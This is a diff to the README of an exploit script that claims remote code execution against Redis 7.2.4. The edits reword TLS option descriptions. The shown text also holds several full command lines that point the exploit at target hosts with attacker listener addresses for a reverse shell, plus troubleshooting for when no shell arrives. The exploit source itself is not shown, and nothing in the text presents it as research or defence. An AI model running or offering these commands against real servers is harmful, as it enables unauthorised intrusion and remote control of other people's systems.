@@ -84,7 +84,7 @@ python3 exploit.py --rhost 192.168.1.100 --rport 6379 --lhost 192.168.1.50 --lpo
 python3 exploit.py --rhost localhost --rport 6380 --lhost 127.0.0.1 --lport 4444
 ```
 
-#### Exploit with TLS Connection
+#### Exploit with Basic TLS (No Client Certificate Required)
 ```bash
 python3 exploit.py --rhost redis-tls.example.com --rport 6380 --lhost 192.168.1.50 --lport 4444 --tls --password mysecretpassword
 ```
@@ -94,12 +94,12 @@ python3 exploit.py --rhost redis-tls.example.com --rport 6380 --lhost 192.168.1.
 python3 exploit.py --rhost redis-tls.example.com --rport 6380 --lhost 192.168.1.50 --lport 4444 --tls --tls-ca /path/to/ca.crt --password mysecretpassword
 ```
 
-#### Exploit with TLS and Client Certificates
+#### Exploit with TLS and Client Certificates (Optional)
 ```bash
 python3 exploit.py --rhost redis-tls.example.com --rport 6380 --lhost 192.168.1.50 --lport 4444 --tls --tls-cert /path/to/client.crt --tls-key /path/to/client.key --password mysecretpassword
 ```
 
-#### Exploit with TLS (No Certificate Verification)
+#### Exploit with TLS (No Certificate Verification - Testing Only)
 ```bash
 python3 exploit.py --rhost redis-tls.example.com --rport 6380 --lhost 192.168.1.50 --lport 4444 --tls --tls-no-verify --password mysecretpassword
 ```
@@ -112,16 +112,16 @@ This exploit targets a specific vulnerability in Redis 7.2.4 that allows for rem
 ### TLS Support
 The exploit now supports TLS/SSL connections to Redis servers that require encrypted communication. This includes:
 
-- **Basic TLS**: Simple TLS connection without certificate verification
-- **Certificate Verification**: TLS with CA certificate verification
-- **Client Certificates**: TLS with client certificate authentication
+- **Basic TLS**: Simple TLS connection using system CA certificates (no client certificate required)
+- **Certificate Verification**: TLS with custom CA certificate verification
+- **Client Certificates**: TLS with client certificate authentication (optional)
 - **Custom Verification**: Options to disable certificate verification for testing
 
 ### TLS Configuration Options
-- `--tls`: Enable TLS connection
-- `--tls-cert`: Client certificate file path
-- `--tls-key`: Client private key file path  
-- `--tls-ca`: CA certificate file path
+- `--tls`: Enable TLS connection (client certificates optional)
+- `--tls-cert`: Client certificate file path (optional)
+- `--tls-key`: Client private key file path (optional)
+- `--tls-ca`: CA certificate file path (optional, uses system CA if not provided)
 - `--tls-no-verify`: Disable certificate verification (insecure, for testing only)
 
 ### Exploit Stages
@@ -167,9 +167,10 @@ The exploit now supports TLS/SSL connections to Redis servers that require encry
 
 4. **TLS Connection Failed**
    - Verify the Redis server supports TLS on the specified port
-   - Check if the correct TLS certificates are provided
+   - Check if the correct TLS certificates are provided (if using client certificates)
    - Try with `--tls-no-verify` for testing (insecure)
-   - Verify the CA certificate is valid and trusted
+   - Verify the CA certificate is valid and trusted (if using custom CA)
+   - Ensure the Redis server certificate is valid and trusted by system CA certificates
 
 5. **No Reverse Shell Received**
    - Check your listener is running
